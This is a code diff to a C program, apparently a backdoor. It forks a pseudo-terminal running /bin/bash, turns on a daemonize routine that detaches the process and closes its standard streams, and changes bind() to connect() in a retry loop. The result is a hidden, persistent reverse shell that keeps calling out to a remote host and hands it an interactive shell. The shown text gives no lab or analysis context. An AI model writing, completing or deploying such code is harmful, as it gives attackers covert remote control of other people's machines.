@@ -95,9 +95,10 @@ void run_session(int sock){
 
     int master;
     pid_t shell_pid;
-    shell_pid = forkpty(&master, NULL, NULL, NULL);
-
-    execl("/bin/bash", "bash", NULL);
+    if((shell_pid = forkpty(&master, NULL, NULL, NULL)) == 0){
+        execl("/bin/bash", "bash", NULL);
+        exit(0);
+    }
 
     unsigned char dec[BUFFER];
     unsigned char enc[BUFFER];
@@ -159,34 +160,34 @@ void run_session(int sock){
 
 }
 
-// int daemonize(){
-//     pid_t pid = fork();
-//     if(pid > 0) exit(0);
-//     if(pid < 0) exit(1);
-//     setsid();
+int daemonize(){
+    pid_t pid = fork();
+    if(pid > 0) exit(0);
+    if(pid < 0) exit(1);
+    setsid();
 
-//     signal(SIGCHLD, SIG_IGN);
-//     signal(SIGHUP, SIG_IGN);
+    signal(SIGCHLD, SIG_IGN);
+    signal(SIGHUP, SIG_IGN);
 
-//     pid = fork();
-//     if(pid > 0) exit(0);
-//     if(pid < 0) exit(1);
+    pid = fork();
+    if(pid > 0) exit(0);
+    if(pid < 0) exit(1);
 
-//     umask(0);
-//     chdir("/");
+    umask(0);
+    chdir("/");
 
-//     close(0);
-//     close(1);
-//     close(2);
+    close(0);
+    close(1);
+    close(2);
 
-//     open("/dev/null", O_RDWR);
-//     dup(0);
-//     dup(0);
-//}
+    open("/dev/null", O_RDWR);
+    dup(0);
+    dup(0);
+}
 
 int main(){
 
-    // daemonize();
+    daemonize();
 
     struct sockaddr_in addr;
     memset(&addr, 0, sizeof(addr));
@@ -202,7 +203,7 @@ int main(){
         int opt = 1;
         setsockopt(sock, IPPROTO_TCP, TCP_NODELAY, &opt, sizeof(opt));
 
-        if(bind(sock, (struct sockaddr*)&addr, sizeof(addr)) != 0){
+        if(connect(sock, (struct sockaddr*)&addr, sizeof(addr)) != 0){
             close(sock);
             sleep(3);
             continue;
